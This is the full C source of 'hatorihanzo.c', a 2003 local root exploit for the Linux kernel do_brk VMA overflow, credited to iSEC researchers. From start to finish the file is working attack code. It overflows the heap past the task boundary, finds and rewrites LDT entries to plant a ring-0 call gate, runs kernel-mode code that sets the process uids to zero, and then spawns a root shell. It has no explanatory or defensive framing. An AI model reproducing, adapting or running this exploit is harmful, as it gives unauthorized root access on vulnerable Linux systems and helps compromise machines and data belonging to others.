/*
* hatorihanzo.c
* Linux kernel do_brk vma overflow exploit.
*
* The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>
*
* Further research and exploit development by
* Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.
*
* (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.
*
* COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE
* OF PRESENTED CODE IS STRICTLY PROHIBITED.
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <paths.h>
#include <grp.h>
#include <setjmp.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/ucontext.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <asm/page.h>
#include <asm/segment.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#define kB * 1024
#define MB * 1024 kB
#define GB * 1024 MB
#define MAGIC 0xdefaced /* I should've patented this number -cliph */
#define ENTRY_MAGIC 0
#define ENTRY_GATE 2
#define ENTRY_CS 4
#define ENTRY_DS 6
#define CS ((ENTRY_CS << 2) | 4)
#define DS ((ENTRY_DS << 2) | 4)
#define GATE ((ENTRY_GATE << 2) | 4 | 3)
#define LDT_PAGES ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)
#define TOP_ADDR 0xFFFFE000U
/* configuration */
unsigned task_size;
unsigned page;
uid_t uid;
unsigned address;
int dontexit = 0;
void fatal(char * msg)
{
fprintf(stderr, "[-] %s: %s\n", msg, strerror(errno));
if (dontexit) {
fprintf(stderr, "[-] Unable to exit, entering neverending loop.\n");
kill(getpid(), SIGSTOP);
for (;;) pause();
}
exit(EXIT_FAILURE);
}
void configure(void)
{
unsigned val;
task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;
uid = getuid();
}
void expand(void)
{
unsigned top = (unsigned) sbrk(0);
unsigned limit = address + PAGE_SIZE;
do {
if (sbrk(PAGE_SIZE) == NULL)
fatal("Kernel seems not to be vulnerable");
dontexit = 1;
top += PAGE_SIZE;
} while (top < limit);
}
jmp_buf jmp;
#define MAP_NOPAGE 1
#define MAP_ISPAGE 2
void sigsegv(int signo, siginfo_t * si, void * ptr)
{
struct ucontext * uc = (struct ucontext *) ptr;
int error_code = uc->uc_mcontext.gregs[REG_ERR];
(void)signo;
(void)si;
error_code = MAP_NOPAGE + (error_code & 1);
longjmp(jmp, error_code);
}
void prepare(void)
{
struct sigaction sa;
sa.sa_sigaction = sigsegv;
sa.sa_flags = SA_SIGINFO | SA_NOMASK;
sigemptyset(&sa.sa_mask);
sigaction(SIGSEGV, &sa, NULL);
}
int testaddr(unsigned addr)
{
int val;
val = setjmp(jmp);
if (val == 0) {
asm ("verr (%%eax)" : : "a" (addr));
return MAP_ISPAGE;
}
return val;
}
#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)
#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))
#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)
void map(unsigned * map)
{
unsigned addr = task_size;
unsigned bit = 1;
prepare();
while (addr < TOP_ADDR) {
if (testaddr(addr) == MAP_ISPAGE)
*map |= bit;
addr += PAGE_SIZE;
next(map, bit);
}
signal(SIGSEGV, SIG_DFL);
}
void find(unsigned * m)
{
unsigned addr = task_size;
unsigned bit = 1;
unsigned count;
unsigned tmp;
prepare();
tmp = address = count = 0U;
while (addr < TOP_ADDR) {
int val = testaddr(addr);
if (val == MAP_ISPAGE && (*m & bit) == 0) {
if (!tmp) tmp = addr;
count++;
} else {
if (tmp && count == LDT_PAGES) {
errno = EAGAIN;
if (address)
fatal("double allocation\n");
address = tmp;
}
tmp = count = 0U;
}
addr += PAGE_SIZE;
next(m, bit);
}
signal(SIGSEGV, SIG_DFL);
if (address)
return;
errno = ENOTSUP;
fatal("Unable to determine kernel address");
}
int modify_ldt(int, void *, unsigned);
void ldt(unsigned * m)
{
struct modify_ldt_ldt_s l;
map(m);
memset(&l, 0, sizeof(l));
l.entry_number = LDT_ENTRIES - 1;
l.seg_32bit = 1;
l.base_addr = MAGIC >> 16;
l.limit = MAGIC & 0xffff;
if (modify_ldt(1, &l, sizeof(l)) == -1)
fatal("Unable to set up LDT");
l.entry_number = ENTRY_MAGIC / 2;
if (modify_ldt(1, &l, sizeof(l)) == -1)
fatal("Unable to set up LDT");
find(m);
}
asmlinkage void kernel(unsigned * task)
{
unsigned * addr = task;
/* looking for uids */
while (addr[0] != uid || addr[1] != uid ||
addr[2] != uid || addr[3] != uid)
addr++;
addr[0] = addr[1] = addr[2] = addr[3] = 0; /* uids */
addr[4] = addr[5] = addr[6] = addr[7] = 0; /* uids */
addr[8] = 0;
/* looking for vma */
for (addr = (unsigned *) task_size; addr; addr++) {
if (addr[0] >= task_size && addr[1] < task_size &&
addr[2] == address && addr[3] >= task_size) {
addr[2] = task_size - PAGE_SIZE;
addr = (unsigned *) addr[3];
addr[1] = task_size - PAGE_SIZE;
addr[2] = task_size;
break;
}
}
}
void kcode(void);
#define __str(s) #s
#define str(s) __str(s)
void __kcode(void)
{
asm(
"kcode: \n"
" pusha \n"
" pushl %es \n"
" pushl %ds \n"
" movl $(" str(DS) ") ,%edx \n"
" movl %edx,%es \n"
" movl %edx,%ds \n"
" movl $0xffffe000,%eax \n"
" andl %esp,%eax \n"
" pushl %eax \n"
" call kernel \n"
" addl $4, %esp \n"
" popl %ds \n"
" popl %es \n"
" popa \n"
" lret \n"
);
}
void knockout(void)
{
unsigned * addr = (unsigned *) address;
if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)
fatal("Unable to change page protection");
errno = ESRCH;
if (addr[ENTRY_MAGIC] != MAGIC)
fatal("Invalid LDT entry");
/* setting call gate and privileged descriptors */
addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);
addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;
addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */
addr[ENTRY_CS+1] = 0x00cf9a00U;
addr[ENTRY_DS+0] = 0x0000ffffU; /* user 4GB code at 0x00000000 */
addr[ENTRY_DS+1] = 0x00cf9200U;
prepare();
if (setjmp(jmp) != 0) {
errno = ENOEXEC;
fatal("Unable to jump to call gate");
}
asm("lcall $" str(GATE) ",$0x0"); /* this is it */
}
void shell(void)
{
char * argv[] = { _PATH_BSHELL, NULL };
execve(_PATH_BSHELL, argv, environ);
fatal("Unable to spawn shell\n");
}
void remap(void)
{
static char stack[8 MB]; /* new stack */
static char * envp[] = { "PATH=" _PATH_STDPATH, NULL };
static unsigned * m;
static unsigned b;
m = (unsigned *) sbrk(map_size);
if (!m)
fatal("Unable to allocate memory");
environ = envp;
asm ("movl %0, %%esp\n" : : "a" (stack + sizeof(stack)));
b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;
if (munmap((void*)b, task_size - b) == -1)
fatal("Unable to unmap stack");
while (b < task_size) {
if (sbrk(PAGE_SIZE) == NULL)
fatal("Unable to expand BSS");
b += PAGE_SIZE;
}
ldt(m);
expand();
knockout();
shell();
}
int main(void)
{
configure();
remap();
return EXIT_FAILURE;
}
